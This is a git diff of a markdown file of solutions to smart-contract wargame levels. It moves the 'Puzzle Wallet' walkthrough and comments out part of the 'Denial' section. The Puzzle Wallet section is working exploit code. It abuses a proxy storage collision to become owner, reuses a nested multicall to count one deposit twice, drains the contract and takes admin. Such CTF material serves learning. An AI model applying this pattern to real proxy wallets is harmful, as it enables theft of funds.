@@ -406,32 +406,7 @@ await contract.revise(i, content)
 ```
 ===> submit level
 
-### Puzzle Wallet
-console
-```
-fS = {
-    name: 'proposeNewAdmin',
-    type: 'function',
-    inputs: [
-        {
-            type: 'address',
-            name: '_newAdmin'
-        }
-    ]
-}
-data = web3.eth.abi.encodeFunctionCall(fS, [player])
-await web3.eth.sendTransaction({from: player, to: instance, data});
-await contract.addToWhitelist(player)
-depositData = await contract.methods["deposit()"].request().then(v => v.data)
-ml = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
-
-await contract.multicall([ml, ml], {value: toWei('0.001')})
-await contract.execute(player, toWei('0.002'), 0x0)
-await contract.setMaxBalance(player)
-```
-
-
-### Denial
+<!-- ### Denial
 `DenialAttack.sol`
 ```
 pragma solidity ^0.6.0;
@@ -444,7 +419,7 @@ contract DenialAttack {
 }
 ```
 Delpoy
-Copy deployed Contracts (like in Preservation level)
+Copy deployed Contracts (like in Preservation level) -->
 
 console
 ```
@@ -483,6 +458,31 @@ Deploy with params:<br>
 Click `buy` button
 
 ===> submit level
+
+### Puzzle Wallet
+console
+```
+fS = {
+    name: 'proposeNewAdmin',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: '_newAdmin'
+        }
+    ]
+}
+data = web3.eth.abi.encodeFunctionCall(fS, [player])
+await web3.eth.sendTransaction({from: player, to: instance, data});
+await contract.addToWhitelist(player)
+depositData = await contract.methods["deposit()"].request().then(v => v.data)
+ml = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
+
+await contract.multicall([ml, ml], {value: toWei('0.001')})
+await contract.execute(player, toWei('0.002'), 0x0)
+await contract.setMaxBalance(player)
+```
+
 
 ### Motorbike
 console
